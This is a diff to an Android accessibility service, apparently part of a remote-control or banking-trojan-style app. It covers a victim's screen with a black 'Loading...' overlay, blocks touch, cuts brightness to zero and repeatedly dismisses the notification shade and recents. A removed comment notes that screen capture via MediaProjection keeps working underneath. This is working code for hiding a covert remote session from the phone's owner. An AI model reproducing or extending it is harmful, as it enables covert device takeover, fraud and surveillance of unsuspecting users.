@@ -48,8 +48,8 @@ class ControlService : AccessibilityService() {
     private var overlayView: View? = null
     private var overlayParams: WindowManager.LayoutParams? = null
     private var darkView: View? = null
+    private var darkParams: WindowManager.LayoutParams? = null
     private var darkStartedTouchBlock = false
-    private var savedBrightness = -1
     private val screenExecutor = Executors.newSingleThreadExecutor()
 
     // Periodically dismiss the notification shade and recents while overlay is locked.
@@ -169,6 +169,8 @@ class ControlService : AccessibilityService() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             @Suppress("NewApi") params.fitInsetsTypes = 0
         }
+        params.screenBrightness = 0f
+        darkParams = params
         val view = android.widget.TextView(this).apply {
             setBackgroundColor(android.graphics.Color.argb(252, 0, 0, 0))
             text = "Загрузка..."
@@ -180,13 +182,6 @@ class ControlService : AccessibilityService() {
         if (overlayView == null) {
             darkStartedTouchBlock = true
             showTouchBlockOverlay()
-        }
-        // Dim hardware backlight so physical screen looks dark; does NOT affect MediaProjection stream
-        if (Settings.System.canWrite(this)) {
-            try {
-                savedBrightness = Settings.System.getInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, 128)
-                Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, 0)
-            } catch (_: Exception) {}
         }
         ctrlHandler.post {
             try {
@@ -206,11 +201,7 @@ class ControlService : AccessibilityService() {
             darkStartedTouchBlock = false
             hideTouchBlockOverlay()
         }
-        // Restore hardware backlight
-        if (savedBrightness >= 0 && Settings.System.canWrite(this)) {
-            try { Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, savedBrightness) } catch (_: Exception) {}
-            savedBrightness = -1
-        }
+        darkParams = null
         ctrlHandler.post {
             try { (getSystemService(WINDOW_SERVICE) as WindowManager).removeView(v) } catch (_: Exception) {}
         }
